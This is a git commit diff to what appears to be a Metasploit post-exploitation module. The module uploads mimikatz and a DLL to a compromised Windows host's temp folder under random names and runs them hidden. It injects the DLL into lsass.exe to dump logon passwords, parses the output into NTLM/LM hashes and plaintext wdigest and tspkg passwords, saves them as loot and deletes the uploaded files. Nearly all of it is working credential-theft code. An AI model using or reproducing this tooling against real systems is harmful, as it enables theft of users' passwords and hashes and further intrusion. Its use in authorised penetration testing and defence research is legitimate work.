dc38e3582b0a54c351c55a5985d71d8b3c2b0a63
Matt Andreko <mandreko@gmail.com>
2012-03-29 16:26:13 -0400

    Added parsing of mimikatz output, and storing to loot. Still needs some work as output is corrupt

--- modules/post/windows/gather/mimikatz.rb
+++ modules/post/windows/gather/mimikatz.rb
@@ -1,7 +1,12 @@
 require 'msf/core'
 require 'rex'
+require 'msf/core/post/file'
+require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
+
+	include Msf::Post::Common
+	include Msf::Post::File
 
         def initialize(info={})
                 super( update_info( info,
@@ -28,8 +33,14 @@ class Metasploit3 < Msf::Post
         end
 
 	def run
+		print_status("Running module against #{sysinfo['Computer']}")
+		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
+                pass_file = store_loot("windows.passwords", "text/plain", session, "", "#{host}_passwords.txt", "Windows Passwords")
+		print_status(pass_file)
+                mimikatz_dump(datastore['GETSYSTEM'], pass_file)
+	end
 
-		sysinfo = session.sys.config.sysinfo
+	def mimikatz_dump(bypassuac, password_file)
 
 		#
 		# Upload mimikatz.exe and sekurlsa.dll
@@ -38,10 +49,10 @@ class Metasploit3 < Msf::Post
 		# randomize the filenames
                 exe_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
 		dll_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".dll"
+		tmpdir = session.fs.file.expand_path("%TEMP%")
 
 		# path to the mimikatz binaries
                 path = ::File.join(Msf::Config.install_root, "data", "post")
-		tmpdir = session.fs.file.expand_path("%TEMP%")
 
 		# decide, x86 or x64
                 mexe = nil
@@ -68,26 +79,24 @@ class Metasploit3 < Msf::Post
 		# Execute mimikatz
 		#
 
-		print_status("Executing %TEMP%\\#{exe_filename}")
+		print_status("Executing #{tmpdir}\\#{exe_filename}")
 		r = session.sys.process.execute("cmd /c \"#{tmpdir}\\#{exe_filename}\"", nil, {'Hidden' => true, 'Channelized' => true})
 
-		#print_status(r.channel.read)
 		r.channel.read
 		r.channel.write("privilege::debug\n")
 		
-		#print_status(r.channel.read)
 		r.channel.read
 		r.channel.write("inject::process lsass.exe \"#{tmpdir}\\#{dll_filename}\"\n")
 		
-		#print_status(r.channel.read)
 		r.channel.read
                 r.channel.write("@getLogonPasswords\n")
-		#while(d = r.channel.read)
-		#	print_status(d)
-		#end
-		#print_status(r.channel.read)
-		r.channel.read
-		print_status(r.channel.read)
+
+		tmpusers = r.channel.read
+		tmpusers += r.channel.read
+
+		users = parse_passdump(tmpusers)
+		output_file(users, password_file)
+
 		r.channel.write("exit\n")
 			
 		# delete the uac bypass payload
@@ -95,8 +104,66 @@ class Metasploit3 < Msf::Post
 		delete_dll = "cmd.exe /c del \"#{tmpdir}\\#{dll_filename}\""	
                 session.sys.process.execute(delete_exe, nil, {'Hidden' => true})
 		session.sys.process.execute(delete_dll, nil, {'Hidden' => true})
+	end
 
+	def parse_passdump(pass_dump)
 
+		users = []
+
+		pass_dump.lines.each do |f|
+
+			current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
+
+			f.each_line do |line|
+				if line.match(/^Utilisateur principal/)
+					current[:username] = line[30..-2]
+				elsif line.match(/^Domaine d'authentification/)
+					current[:domain] = line[30..-2]
+				elsif line.match(/msv1_0/)
+					tmp = line[24..-2]
+					if tmp == "n.t. (LUID KO)"
+						current[:lmhash] = ""
+						current[:ntlmhash] = ""
+					else
+						current[:lmhash] = line[28, 32]
+						current[:ntlmhash] = line[70, 32]
+					end
+				elsif line.match(/wdigest/)
+					tmp = line[24..-2]
+					if tmp == "n.t. (LUID KO)"
+						current[:wdigest] = ""
+					else
+						if tmp.nil?
+							current[:wdigest] = ""
+						else
+							current[:wdigest] = tmp
+						end
+					end
+				elsif line.match(/tspkg/)
+					tmp = line[24..-2]
+					if tmp == "n.t. (LUID KO)"
+						current[:tspkg] = ""
+					else
+						current[:tspkg] = tmp
+					end
+
+					users.push(current)
+					current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
+				end
+			end
+		end	
+		
+		return users
+	end
+
+	def output_file(users, password_file)
+
+		output = "username, domain, lmhash, ntlmhash, wdigest, tspkg\n"
+		users.each do |u|
+			output += "#{u[:username]}, #{u[:domain]}, #{u[:lmhash]}, #{u[:ntlmhash]}, #{u[:wdigest]}, #{u[:tspkg]}\n" 
+		end
+
+		file_local_write(password_file, output)	
 
 	end
 
